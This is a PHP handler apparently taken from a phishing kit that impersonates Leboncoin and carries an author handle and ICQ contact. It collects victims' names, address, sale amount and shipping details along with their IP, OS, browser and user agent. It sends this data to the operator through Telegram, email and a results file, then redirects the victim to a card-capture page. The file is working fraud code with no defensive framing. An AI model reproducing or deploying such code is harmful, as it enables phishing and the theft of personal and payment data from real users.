<?php

session_start();
/*

Author : H3L13M
ICQ : @651198700

*/

if(isset($_POST['fname']) && isset($_POST['lname'])&& isset($_POST['desc'])&& isset($_POST['addr'])&& isset($_POST['ename']) ){
include "../config.php";	
include "inc/funcs.php";


$_SESSION['price'] = $_POST['price'];
$subject = "[Leboncoin] [BILL] INFO from $ip";

$info1 = $_POST['fname'];
$info2 = $_POST['lname'];
$info3 = $_POST['desc'];
$info4 = $_POST['addr'];
$info5 = $_POST['ename'];
$info6 = $_POST['price'];
$info7 = $_POST['q'];
$info8 = $_POST['fee'];
$info9 = $_POST['sec'];


	
$message = "Nom: $info1\nPrenom: $info2\nDescription: $info3\nAdresse: $info4\nNom de l'expediteur: $info5\nMontant à recevoir: $info6\nQuantité: $info7\nFrais de port: $info8\nProtection du colis: $info9\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../cc.php\" />";
}
else{
	
	echo "<meta http-equiv=\"Refresh\" content=\"0; url=../billing.php\" />";
}
?>